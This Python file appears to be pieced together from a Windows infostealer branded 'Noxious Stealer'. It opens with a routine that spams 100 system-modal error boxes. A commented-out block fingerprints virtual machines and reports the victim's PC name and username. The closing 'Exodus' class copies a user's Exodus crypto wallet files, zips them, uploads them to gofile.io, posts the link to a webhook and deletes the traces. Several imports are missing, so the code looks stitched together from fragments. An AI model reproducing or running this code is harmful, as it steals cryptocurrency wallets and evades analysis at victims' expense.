import ctypes
import threading
import random
import time
import win32api
import win32con

def show_error_box():
    MB_OK = 0x0
    MB_ICONERROR = 0x10
    MB_SYSTEMMODAL = 0x1000
    text = "This is an error message."
    title = "Error"
    
    screen_width = win32api.GetSystemMetrics(0)
    screen_height = win32api.GetSystemMetrics(1)
    x = random.randint(0, screen_width - 200)  
    y = random.randint(0, screen_height - 100) 
    

    ctypes.windll.user32.MessageBoxW(0, text, title, MB_OK | MB_ICONERROR | MB_SYSTEMMODAL)
    hWnd = win32api.FindWindow(None, title)
    if hWnd:
        win32api.SetWindowPos(hWnd, win32con.HWND_TOPMOST, x, y, 0, 0, win32con.SWP_NOSIZE)

def spam_error_boxes(count):
    threads = []
    for _ in range(count):
        thread = threading.Thread(target=show_error_box)
        threads.append(thread)
        thread.start()
        time.sleep(0.05)
    
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    number_of_boxes = 100 
    spam_error_boxes(number_of_boxes)


#def check_vm():
#    vm_processes = ["vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "vmacthlp.exe", "vmsrvc.exe", "xenservice.exe"]
#    vm_drivers = ["VBoxMouse.sys", "VBoxGuest.sys", "VBoxSF.sys", "VBoxVideo.sys", "vmhgfs.sys", "vmxnet.sys", "vmmouse.sys", "vmci.sys", "vmx_svga.sys"]
#    detected_processes = [proc for proc in vm_processes if proc.lower() in os.popen("tasklist").read().lower()]
#    detected_drivers = [driver for driver in vm_drivers if os.path.exists(f"C:\\Windows\\System32\\drivers\\{driver}")]
#
#    return detected_processes, detected_drivers
#
#def check_registry_key(key):
#    try:
#        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key) as reg_key:
#            return True
#    except FileNotFoundError:
#        return False
#    except Exception as e:
#        print(e)
#        return False
#
#pc_username = os.getlogin()
#pc_name = platform.node()
#platform_name = platform.system()
#detected_processes, detected_driver = check_vm()
#antivm = {
#    "title": pc_username,
#    "color": 0x000000,
#    "author": {
#        "name": "Virtual Machine Detected / Virus Total Scan ",
#        "icon_url": "https://img.icons8.com/pastel-glyph/64/security-checked--v1.png"
#    },
#    "footer": {
#        "text": "VM Protection | https://github.com/Api14"
#    },
#    "fields": [
#        {"name": "PC Information", "value": f"<a:egptick:798084594552537099> PC Name: `{pc_name}`\n<a:egptick:798084594552537099> Username: `{pc_username}`\n<a:egptick:798084594552537099> Platform: `{platform_name}`", "inline": False},
#        {"name": "Virtual Machine", "value": "True", "inline": False},
#        {"name": "Detected Processes", "value": "\n".join(detected_processes) if detected_processes else "None", "inline": False},
#        {"name": "Detected Drivers", "value": "\n".join(detected_driver) if detected_driver else "None", "inline": False}
#    ]
#}
#send_embed(antivm)




class Exodus:
    def __init__(self):
        self.amountfiles = 0
        try:
            self.path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Exodus")
            self.stealexo(os.path.join(self.path, "exodus.wallet"))
        except Exception as e:
            print(f"Error: {e}")

    def stealexo(self, path):
        exopath = os.path.join(os.getcwd(), "Exodus")
        os.mkdir(exopath)
        P = os.listdir(path)
        for i in P:
            self.amountfiles += 1
            shutil.copy(os.path.join(path, i), os.path.join(exopath, i))
        zip_path = os.path.join(os.getcwd(), "Exodus.zip")
        with zipfile.ZipFile(zip_path, "w") as zip_file:
            for root, dirs, files in os.walk(exopath):
                for file in files:
                    zip_file.write(os.path.join(root, file))
        with open(zip_path, "rb") as file:
            with open(zip_path, "rb") as file:
                 response = requests.post("https://store2.gofile.io/uploadFile", files={"file": file})
            if response.ok:
                download = response.json()["data"]["file"]["url"]["short"]
                files_str = "\n".join([f"  |_ {file}" for file in os.listdir(exopath)])
                embed = {
                    "title": "Exodus Log Files",
                    "description": f"```\nExodus\n|_ Exodus Log Files\n{files_str}\n```",
                    "color": 13290186,
                    "url": download
                }
                payload = {
                    "username": "Noxious Stealer",
                    "avatar_url": "",
                    "embeds": [embed]
                }
                headers = {'Content-Type': 'application/json'}
                requests.post(webhook, headers=headers, data=json.dumps(payload))
        shutil.rmtree("Exodus")
        os.remove("Exodus.zip")